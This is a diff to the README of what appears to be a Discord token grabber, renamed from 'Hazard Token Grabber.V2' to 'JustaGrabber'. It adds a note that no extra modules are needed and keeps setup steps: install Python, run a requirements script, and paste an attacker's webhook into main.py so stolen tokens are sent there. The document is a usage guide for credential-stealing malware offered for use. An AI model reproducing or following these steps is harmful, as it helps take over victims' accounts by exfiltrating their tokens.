@@ -15,7 +15,11 @@
 
 <p align="left"><img src="https://media.discordapp.net/attachments/853578499096707082/904282108074295356/unknown.png?width=1107&height=676"</p>
 
-### 📁・Setting up Hazard Token Grabber.V2
+### ❗ About modules
+JustaGrabber dosen't needs any other modules. 
+Just need python 3's internal module!
+ 
+### 📁
 1. Start off by installing [python](https://www.python.org/) ofc
 2. run the `Install_requirements.cmd` and wait for it to install the requirements
 3. open main.py with any code editor of your choice and paste your webhook on line 7
